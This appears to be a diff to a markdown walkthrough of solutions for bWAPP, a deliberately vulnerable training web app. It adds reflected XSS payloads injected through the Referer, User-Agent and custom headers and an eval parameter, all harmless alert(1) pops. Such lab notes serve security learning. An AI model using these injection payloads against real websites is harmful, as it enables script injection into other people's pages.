@@ -225,6 +225,33 @@ Alternatively I was able to get XSS to execute on the AJAX called.
 xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>prompt(0)</script></html>
 ```
 
+### XSS - Reflected (Back Button)
+Modify Referer header field
+```
+Referer: ';alert(1);'
+```
+
+### XSS - Reflected (Custom Header)
+Add header field
+```
+bWAPP: <script>alert(1)</script>
+```
+
+### XSS - Reflected (Eval)
+```
+date=alert(1)
+```
+
+### XSS - Reflected (HREF)
+```
+Referer: <script>alert(1)</script>
+```
+
+### XSS - Reflected (User-Agent)
+```
+User-Agent: <script>alert(1)</script>
+```
+
 # A4 - Insecure Direct Object References
 
 ### Insecure DOR (Change Secret)
